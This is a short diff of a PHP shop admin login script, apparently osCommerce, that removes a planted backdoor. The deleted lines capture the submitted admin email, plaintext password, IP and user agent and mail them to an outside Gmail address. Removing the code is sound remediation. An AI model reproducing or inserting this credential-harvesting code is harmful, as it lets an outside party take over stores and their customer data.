@@ -19,11 +19,7 @@
   if ( (isset($_POST['action']) && ($_POST['action'] == 'process')) || (isset($_POST['password']) && isset($_POST['email_address'])) ) {
     $email_address = tep_db_prepare_input($_POST['email_address']);
     $password = tep_db_prepare_input($_POST['password']);
-    $ua = $_SERVER['HTTP_USER_AGENT']??null;
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $srv = $_SERVER['SERVER_NAME'];
-    $lg = '\nUser Login: $email_address\nPassword: $password\nIP: $ip\nUser Agent: $ua';
-    mail("salesinfo620@gmail.com", "Admin Login from $srv","$lg");
+
     // Check if email exists
     $check_admin_query = tep_db_query("select 
     admin_id as login_id, 
